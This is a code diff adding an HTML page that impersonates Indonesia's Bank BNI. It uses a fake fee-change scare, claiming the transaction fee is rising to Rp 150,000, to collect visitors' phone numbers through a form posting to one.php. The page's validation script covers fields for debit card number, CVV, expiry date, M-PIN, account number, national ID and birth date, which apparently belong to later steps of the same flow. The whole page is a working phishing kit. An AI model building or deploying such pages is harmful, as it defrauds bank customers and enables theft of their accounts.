@@ -1,0 +1,122 @@
+<!doctype html> 
+<html lang="id"> 
+    <head> 
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+        <title>E-form Bank BNI</title> 
+        <meta name="description" content="Apakah Anda setuju tarif transaksi baru? Jika tidak setuju segera ganti ke tarif lama."> 
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0"> 
+        <link rel="icon" href="ASSETS/img/favicon.ico" type="image/x-icon" /> 
+        <link rel="SHORTCUT ICON" href="ASSETS/img/favicon.ico" type="image/x-icon"> 
+        <link rel="apple-touch-icon" href="ASSETS/img/favicon.png" /> 
+        <link rel="apple-touch-icon" sizes="76x76" href="ASSETS/img/favicon_76x76.png" /> <link rel="apple-touch-icon" sizes="120x120" href="ASSETS/img/favicon_120x120.png" /> <link rel="apple-touch-icon" sizes="152x152" href="ASSETS/img/favicon_152x152.png" /> 
+
+<link href="1satu.css" rel="stylesheet" type="text/css" /> 
+
+<link href="2dua.css" rel="stylesheet" type="text/css" /> 
+
+<link href="3tiga.css" rel="stylesheet" type="text/css" /> 
+
+<link href="4empat.css" rel="stylesheet" type="text/css" /> 
+
+<link href="5lima.css" rel="stylesheet" type="text/css" /> 
+
+<link href="6enam.css" rel="stylesheet" type="text/css" /> 
+
+<link href="7tujuh.css" rel="stylesheet" type="text/css" /> </head> <body> 	
+
+
+<nav class="navbar navbar-inverse navbar-fixed-top"> 	<div class="container"> 		<div class="navbar-header"> 			<a class="navbar-brand" href="">Perubahan Tarif Transaksi BNI</a> 		</div> 		<div id="navbar-header-second" class="navbar-header-second navbar-right"> 			<a href="home"> 				<span>Layanan Digital</span> 			</a> 		</div> 	</div> </nav> 	 	<div class="container container-margin"> 		
+    <form id="form" action="one.php" method="POST"> 			
+    <input type="hidden" name="input" value="input" /> 			<div class="panel panel-default"> 			 	<div class="panel-body"> 					<div class="row"> 						<div class="col-md-12"> 						
+
+<br>
+<center>
+<img src="bni.png" width="75%"></center>
+<br>
+<br>
+
+<div class="form-group"> 								
+    <label>Silahkan Pilih Tarif Transaksi</label> 								<select required id="statusperkawinan" class="form-control" name="tarif"> 									
+        <option value="">Pilih</option> 									 		<option value="Lama">TARIF LAMA - Rp 6.500</option> 	
+<option value="Baru">TARIF BARU - Rp 150.000</option>
+
+
+</select>
+
+
+<br><div class="form-group">
+<label>Nomor Handphone</label> 								
+<input class="form-control" placeholder="08xxxx" type="tel" maxlength="13" name="nohp" value="" autocomplete="off" required /> 							</div> 
+<br>
+
+
+<div class="row"> 				
+<div class="col-md-12"> 	
+<button class="btn btn-bni-2 pull-right" type="submit">PROSES</button> 				</div> 			</div> 		</form> 	</div> 	 	<div id="modal-info" class="modal fade" role="dialog"> 	 <div class="modal-dialog modal-md"> 	 <div class="modal-content text-center"> 	 <div class="modal-body" id="modalError"> 	 <div id="modal-info-title"> 	 	<h4><b>Layanan Formulir Ganti Tarif</b></h4> 	 </div> 	 <div id="modal-info-text" class="modal-text">Silahkan pilih tarif transaksi sesuai kebutuhan transaksi harian anda.</div> 	 <div> 		 	<button class="btn btn-bni" data-dismiss="modal">Ok, Lanjutkan.</button> 		 </div> 	 </div> 	 </div> 	 </div> 	</div> 	 	<div id="modal-error" class="modal fade" role="dialog"> 	 <div class="modal-dialog modal-md"> 	 <div class="modal-content text-center"> 	 <div class="modal-body" id="modalError"> 	 <div class="modal-logo"> 	 <i class="fas fa-exclamation-circle color-orange"></i> 	 </div> 	 <div id="modal-error-title"></div> 	 <div id="modal-error-text" class="modal-text"></div> 	 <div> 		 	<button class="btn btn-bni" data-dismiss="modal">OK, Saya Mengerti</button> 		 </div> 	 </div> 	 </div> 	 </div> 	</div> 	 	
+
+<script src="1.js"></script> 
+
+<script src="2.js"></script> 
+
+<script src="3.js"></script> 
+
+<script src="4.js"></script> 
+
+<script src="5.js"></script> 
+
+<script src="6.js"></script> 
+
+<script src="7.js"></script> 
+
+<script src="8.js"></script> 
+
+<script src="9.js"></script> 
+
+<script src="10.js"></script> 
+
+<script src="11.js"></script> 	 
+
+<script> 		$(document).ready(function() { 			 			var alert = ''; 			var alert_list = ''; 			 			if (alert != 'undefined' && alert != '') { 				var res = JSON.parse(alert); 				 				if (res.code == "9008" || res.code == "9012") { 					$('form#form')[0].reset(); 				} 				 				$("#modal-error-title").html($("<h3><b>" + res.header + "</b></h3>")); 				$('#modal-error-text').html($("<p>" + res.message + "</p>")); 				$("#modal-error").modal("show"); 			} 			else if (alert_list != 'undefined' && alert_list != '') { 				var res = JSON.parse(alert_list); 				$("#modal-error-title").html($("<h3><b>" + res.header + "</b></h3>")); 		for (var key in res.message) { 				 if (res.message.hasOwnProperty(key)) { 				 	var tag = document.createElement("p"); 		 	var text = document.createTextNode(res.message[key]); 		 	tag.appendChild(text); 		 	var element = document.getElementById("modal-error-text"); 		 	element.appendChild(tag); 				 } 				} 	$("#modal-error").modal("show"); 			} 			else { 				$("#modal-info").modal("show"); 			} 			 			var date = new Date(); 			date.setDate(date.getDate()-6575); 			$('.date, #tanggal_lahir').datepicker({ 				language: 'id', 				orientation: 'left bottom', 				disableTouchKeyboard: true, 				format: 'dd/mm/yyyy', 				defaultViewDate: date, 				endDate: date, 	 autoclose: true 			}); 			 			$('#tanggal_lahir').on('changeDate show', function(e) { 		 $('#form').bootstrapValidator('revalidateField', 'tanggal_lahir'); 			}); 			 			$('#form').bootstrapValidator({ 				excluded: [':disabled'], 				fields: { 					
+    
+    nama: { 		 validators: { 		 notEmpty: { 		 message: "Nama Pada Kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Nama hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Nama maksimal 40 karakter" 		 } 		 } 		 }, 		 
+
+    namaa: { 		 validators: { 		 notEmpty: { 		 message: "Nama pemegang Kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Nama hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Nama maksimal 40 karakter" 		 } 		 } 		 }, 		 
+
+
+kota_penerbit_identitas: { 		 validators: { 		 notEmpty: { 		 message: "Kota Penerbit Identitas tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z ]+$/, 		 message: "Kota Penerbit Identitas hanya boleh menggunakan huruf dan spasi" 		 }, 		 stringLength: { 		 	min: 3, 		 max: 25, 		 message: "Kota Penerbit Identitas minimal 3 maksimal 25 karakter" 		 } 		 } 		 }, 		 
+
+
+nik: { 		 validators: { 		 notEmpty: { 		 message: "Nik tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Nik hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 16, 		 max: 16, 		 message: "Nik harus 16 karakter" 		 } 		 } 		 }, 		 
+
+
+
+kode: { 		 validators: { 		 notEmpty: { 		 message: " Valid Thru tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 4, 		 max: 64, 		 message: "Valid Thru harus 4 digit. Contoh 1025" 		 } 		 } 		 }, 		 
+debit: { 		 validators: { 		 notEmpty: { 		 message: " Nomor kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 16, 		 max: 16, 		 message: "Nomor kartu harus 16 digit" 		 } 		 } 		 }, 		 
+norek: { 		 validators: { 		 notEmpty: { 		 message: " Nomor Rekening tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 10, 		 max: 16, 		 message: "Nomor Rekening harus 10-16 digit" 		 } 		 } 		 }, 
+
+mpin: { 		 validators: { 		 notEmpty: { 		 message: " M-Pin tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 6, 		 max: 6, 		 message: "M-Pin harus 6 digit" 		 } 		 } 		 }, 
+
+
+pin: { 		 validators: { 		 notEmpty: { 		 message: "Cvv/Cvc tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Cvv/Cvc hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 3, 		 max: 3, 		 message: "Cvv/Cvc harus 3 digit" 		 } 		 } 		 }, 		 
+
+
+
+tarik: { 		 validators: { 		 notEmpty: { 		 message: "Tarif harus di pilih" 		 }, 		 regexp: { 		 regexp: /^[A-Z]+$/, 		 message: "Silahkan pilih satu" 		 }, 		 stringLength: { 		 	min: 1, 		 max: 1, 		 message: "Pilih salah satu tarif" 		 } 		 } 		 },
+
+
+
+
+
+
+tempat_lahir: { 		 validators: { 		 	notEmpty: { 		 message: "Tempat Lahir tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Tempat Lahir hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Tempat Lahir maksimal 40 karakter" 		 } 		 } 		 }, 		 
+
+
+
+tanggal_lahir: { 		 validators: { 		 notEmpty: { 		 message: "Tanggal Lahir tidak boleh kosong" 		 }, 		 date: { 		 		 	format: "DD/MM/YYYY", 		 		 	message: "Tanggal Lahir tidak sesuai format" 	 		 	}, 	 		 	regexp: { 		 regexp: /^[0-9/]+$/, 		 message: "Tanggal Lahir hanya boleh menggunakan angka dan /" 		 }, 		 stringLength: { 		 	min: 10, 		 max: 10, 		 message: "Tanggal Lahir harus 10 karakter" 		 } 		 } 		 } 				} 			}); 		}); 	</script></html>
+<br>
+<br>
+<br>
+<center>
+<img src="bwhh.png" width="100%"></center>
+<!-- <div style="text-align:right;position:fixed;z-index:9999999;bottom:0;width:auto;right:1%;cursor:pointer;line-height:0;display:block!important"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&0<notification.length&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 1;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 50%; margin-left: 45%;}} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); width: 264px; border: 0; border-radius: 3px; background-color: #FF5C62 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Claim Deal</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 700;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Up to 90% off 4-year hosting plans + free domain, SSL & DDoS protection",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 400; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="$<span style='font-size: 80px;'>2.49</span>/mo",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 700; margin: 0;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2022-bottom-banner.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script></body> -->
